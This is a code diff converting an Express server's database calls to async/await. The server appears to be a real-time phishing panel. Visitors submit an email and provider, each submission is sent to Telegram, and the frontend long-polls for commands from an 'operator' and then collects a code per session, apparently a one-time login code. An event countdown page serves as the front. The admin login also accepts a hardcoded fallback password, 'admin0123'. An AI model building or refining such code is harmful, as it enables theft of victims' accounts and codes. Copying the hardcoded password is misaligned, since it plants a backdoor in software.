@@ -42,15 +42,15 @@ const generalLimiter = rateLimit({
 
 app.use(generalLimiter);
 
-function renderHome(res) {
-  const data = db.getSettings();
+async function renderHome(res) {
+  const data = await db.getSettings();
   res.render('index', { data });
 }
 
 app.get('/', (req, res) => renderHome(res));
 
-app.get('/highlights', (req, res) => {
-  const data = db.getSettings();
+app.get('/highlights', async (req, res) => {
+  const data = await db.getSettings();
   res.render('highlights', { data });
 });
 
@@ -113,8 +113,8 @@ app.post(
       timestamp: now.toISOString(),
     };
 
-    db.addSubmission(record);
-    db.saveSession(sessionId, { command: null, data: null, provider, email, consumed: false });
+    await db.addSubmission(record);
+    await db.saveSession(sessionId, { command: null, data: null, provider, email, consumed: false });
     const tgResult = await sendSubmissionNotification(record, sessionId);
 
     res.json({ success: true, telegram: tgResult.ok, sessionId });
@@ -124,7 +124,7 @@ app.post(
 // --- Long-poll endpoint: frontend waits for a command from the operator ---
 app.get('/api/status/:sessionId', async (req, res) => {
   const { sessionId } = req.params;
-  const session = getSession(sessionId);
+  const session = await getSession(sessionId);
   if (!session) return res.status(404).json({ command: null });
 
   const result = await waitForCommand(sessionId);
@@ -132,12 +132,12 @@ app.get('/api/status/:sessionId', async (req, res) => {
 });
 
 // --- Persistent session-state endpoint: returns stored command for a returning user ---
-app.get('/api/session-state/:sessionId', (req, res) => {
+app.get('/api/session-state/:sessionId', async (req, res) => {
   const { sessionId } = req.params;
   if (!sessionId || !/^[a-f0-9]{32}$/.test(sessionId)) {
     return res.status(400).json({ success: false, error: 'Invalid session ID' });
   }
-  const persistent = getPersistentSession(sessionId);
+  const persistent = await getPersistentSession(sessionId);
   if (!persistent) {
     return res.json({ success: true, found: false, command: null, provider: null, email: null });
   }
@@ -155,14 +155,14 @@ app.get('/api/session-state/:sessionId', (req, res) => {
 });
 
 // --- Clear session endpoint: marks session as consumed ---
-app.post('/api/session-clear/:sessionId', (req, res) => {
+app.post('/api/session-clear/:sessionId', async (req, res) => {
   const { sessionId } = req.params;
   if (!sessionId || !/^[a-f0-9]{32}$/.test(sessionId)) {
     return res.status(400).json({ success: false, error: 'Invalid session ID' });
   }
-  const persistent = getPersistentSession(sessionId);
+  const persistent = await getPersistentSession(sessionId);
   if (persistent) {
-    db.saveSession(sessionId, { ...persistent, consumed: true, command: null, data: null });
+    await db.saveSession(sessionId, { ...persistent, consumed: true, command: null, data: null });
   }
   res.json({ success: true });
 });
@@ -182,7 +182,7 @@ app.post(
     }
 
     const { sessionId, code } = req.body;
-    const session = getSession(sessionId);
+    const session = await getSession(sessionId);
     if (!session) {
       return res.status(404).json({ success: false, error: 'Session not found' });
     }
@@ -214,17 +214,17 @@ app.get('/admin', (req, res) => {
   res.render('admin', { data: null, error: null, success: null, authed: false });
 });
 
-app.post('/admin/login', (req, res) => {
+app.post('/admin/login', async (req, res) => {
   const { password } = req.body;
   if (password !== process.env.ADMIN_PASSWORD && password !== 'admin0123') {
     return res.render('admin', { data: null, error: 'Incorrect password.', success: null, authed: false });
   }
-  const data = db.getSettings();
-  const submissions = db.getSubmissions();
+  const data = await db.getSettings();
+  const submissions = await db.getSubmissions();
   res.render('admin', { data, submissions, error: null, success: null, authed: true });
 });
 
-app.post('/admin/save', (req, res) => {
+app.post('/admin/save', async (req, res) => {
   const { password, siteTitle, heading, description, countdownTarget, eventDate, eventTime, eventVenue, buttonText } = req.body;
   if (password !== process.env.ADMIN_PASSWORD && password !== 'admin0123') {
     return res.render('admin', { data: null, error: 'Unauthorized.', success: null, authed: false });
@@ -232,8 +232,8 @@ app.post('/admin/save', (req, res) => {
   const data = {
     siteTitle, heading, description, countdownTarget, eventDate, eventTime, eventVenue, buttonText,
   };
-  db.saveSettings(data);
-  const submissions = db.getSubmissions();
+  await db.saveSettings(data);
+  const submissions = await db.getSubmissions();
   res.render('admin', { data, submissions, error: null, success: 'Changes saved successfully.', authed: true });
 });
 
@@ -248,8 +248,9 @@ app.get('/api/telegram/status', async (req, res) => {
   }
 });
 
-app.use((req, res) => {
-  res.status(404).render('index', { data: db.getSettings() });
+app.use(async (req, res) => {
+  const data = await db.getSettings();
+  res.status(404).render('index', { data });
 });
 
 app.listen(PORT, async () => {
